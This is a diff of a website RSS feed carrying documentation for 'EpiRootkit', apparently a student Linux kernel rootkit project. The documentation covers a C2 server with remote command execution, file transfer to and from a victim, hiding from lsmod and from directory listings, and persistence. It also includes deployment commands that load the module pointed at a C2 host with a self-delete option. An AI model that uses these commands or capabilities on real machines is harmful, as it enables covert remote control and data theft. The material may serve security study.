@@ -1,11 +1,11 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>EpiRootkit on Tux Fan Club Docs</title><link>/docs/05-epirootkit/</link><description>Recent content in EpiRootkit on Tux Fan Club Docs</description><generator>Hugo</generator><language>en</language><lastBuildDate>Sat, 31 May 2025 18:51:21 +0200</lastBuildDate><atom:link href="/docs/05-epirootkit/index.xml" rel="self" type="application/rss+xml"/><item><title>Configuration Justifications</title><link>/docs/05-epirootkit/configuration-justifications/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/05-epirootkit/configuration-justifications/</guid><description>&lt;h2 id="target-environment">Target Environment &lt;a href="#target-environment" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ul>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>EpiRootkit on Tux Fan Club Docs</title><link>/docs/05-epirootkit/</link><description>Recent content in EpiRootkit on Tux Fan Club Docs</description><generator>Hugo</generator><language>en</language><lastBuildDate>Sun, 01 Jun 2025 02:02:11 +0200</lastBuildDate><atom:link href="/docs/05-epirootkit/index.xml" rel="self" type="application/rss+xml"/><item><title>Configuration Justifications</title><link>/docs/05-epirootkit/configuration-justifications/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/05-epirootkit/configuration-justifications/</guid><description>&lt;h2 id="target-environment">Target Environment &lt;a href="#target-environment" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ul>
 &lt;li>&lt;strong>OS&lt;/strong>: Ubuntu 20.04 LTS (Focal Fossa)&lt;/li>
 &lt;li>&lt;strong>Kernel&lt;/strong>: 5.4.0-26-generic&lt;/li>
 &lt;/ul>
 &lt;h3 id="why-ubuntu-2004-lts">Why Ubuntu 20.04 LTS? &lt;a href="#why-ubuntu-2004-lts" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;p>&lt;strong>Primary Reason&lt;/strong>: Ubuntu 20.04 ships with kernel 5.4.0-26-generic pre-compiled and ready to use.&lt;/p>
 &lt;p>&lt;strong>Additional Benefits&lt;/strong>:&lt;/p>
 &lt;ul>
-&lt;li>Widespread enterprise deployment&lt;/li>
+&lt;li>Widespread deployment&lt;/li>
 &lt;li>5-year LTS support lifecycle (until 31 May 2025&amp;hellip; I&amp;rsquo;m so sad)&lt;/li>
 &lt;/ul>
 &lt;h3 id="why-kernel-540-specifically">Why Kernel 5.4.0 Specifically? &lt;a href="#why-kernel-540-specifically" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;p>Kernel 5.4.0 sits in a &lt;strong>unique security window&lt;/strong> that makes rootkit development straightforward:&lt;/p>
@@ -38,7 +38,7 @@
 &lt;li>&lt;strong>Remote Commands&lt;/strong>: Execute shell commands with output capture&lt;/li>
 &lt;li>&lt;strong>File Transfer&lt;/strong>: Upload/download files between C2 and victim&lt;/li>
 &lt;li>&lt;strong>Authentication&lt;/strong>: SHA-512 password verification with rate limiting&lt;/li>
-&lt;li>&lt;strong>XOR Encryption&lt;/strong>: Simple, reliable 32-byte key encryption for all C2 traffic&lt;/li>
+&lt;li>&lt;strong>XOR Encryption&lt;/strong>: 32-byte key encryption for all C2 traffic&lt;/li>
 &lt;li>&lt;strong>Stealth&lt;/strong>: Hide module from &lt;code>lsmod&lt;/code> and files from directory listings&lt;/li>
 &lt;li>&lt;strong>Persistence&lt;/strong>: Multiple mechanisms to survive reboots&lt;/li>
 &lt;/ul>
@@ -108,7 +108,7 @@ status Client-1
 &lt;li>&lt;strong>Language&lt;/strong>: C (kernel module) + Node.js (C2 server)&lt;/li>
 &lt;li>&lt;strong>APIs&lt;/strong>: ftrace, kretprobe, VFS, UDP sockets&lt;/li>
 &lt;li>&lt;strong>Network&lt;/strong>: TCP (C2) + UDP (DNS resolution)&lt;/li>
-&lt;li>&lt;strong>Encryption&lt;/strong>: XOR cipher with 32-byte hardcoded key (bulletproof reliability)&lt;/li>
+&lt;li>&lt;strong>Encryption&lt;/strong>: XOR cipher with 32-byte hardcoded key&lt;/li>
 &lt;li>&lt;strong>Authentication&lt;/strong>: SHA-512 with rate limiting (5 attempts/60s)&lt;/li>
 &lt;/ul>
 &lt;h2 id="configuration">Configuration &lt;a href="#configuration" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>Edit &lt;code>rootkit/core/config.h&lt;/code>:&lt;/p></description></item><item><title>Build &amp; Deployment</title><link>/docs/05-epirootkit/deployment/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/05-epirootkit/deployment/</guid><description>&lt;h1 id="build--deployment">Build &amp;amp; Deployment &lt;a href="#build--deployment" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>How to build and deploy EpiRootkit on Ubuntu 20.04 with kernel 5.4.0.&lt;/p>
@@ -230,8 +230,8 @@ sudo ./deploy_rootkit.sh --verbose&lt;/code>
  
 
  &lt;div class="prism-codeblock ">
- &lt;pre id="284770d" class="language-bash ">
- &lt;code># Ultimate stealth deployment
+ &lt;pre id="feb98c6" class="language-bash ">
+ &lt;code># Stealth deployment
 sudo ./deploy_rootkit.sh address=c2.example.com port=443 --self-delete
 
 # Deploy with verbose output then self-destruct
@@ -273,7 +273,7 @@ sudo insmod epirootkit.ko address=192.168.200.11 port=4444
 sudo insmod epirootkit.ko&lt;/code>
  &lt;/pre>
  &lt;/div>
-&lt;h2 id="self-cleanup-features">Self-Cleanup Features &lt;a href="#self-cleanup-features" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>The deployment script includes advanced stealth capabilities:&lt;/p></description></item><item><title>Connection &amp; Authentication</title><link>/docs/05-epirootkit/connection-authentication/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/05-epirootkit/connection-authentication/</guid><description>&lt;h1 id="connection--authentication">Connection &amp;amp; Authentication &lt;a href="#connection--authentication" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>How EpiRootkit connects to the C2 server and handles authentication with &lt;strong>domain support&lt;/strong> and &lt;strong>XOR encryption&lt;/strong>.&lt;/p>
+&lt;h2 id="self-cleanup-features">Self-Cleanup Features &lt;a href="#self-cleanup-features" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>The deployment script includes stealth capabilities:&lt;/p></description></item><item><title>Connection &amp; Authentication</title><link>/docs/05-epirootkit/connection-authentication/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/05-epirootkit/connection-authentication/</guid><description>&lt;h1 id="connection--authentication">Connection &amp;amp; Authentication &lt;a href="#connection--authentication" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>How EpiRootkit connects to the C2 server and handles authentication with &lt;strong>domain support&lt;/strong> and &lt;strong>XOR encryption&lt;/strong>.&lt;/p>
 &lt;h2 id="connection-process">Connection Process &lt;a href="#connection-process" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>When the rootkit loads, it automatically:&lt;/p>
 &lt;ol>
 &lt;li>&lt;strong>Starts connection thread&lt;/strong> (&lt;code>epirootkit_conn&lt;/code>)&lt;/li>
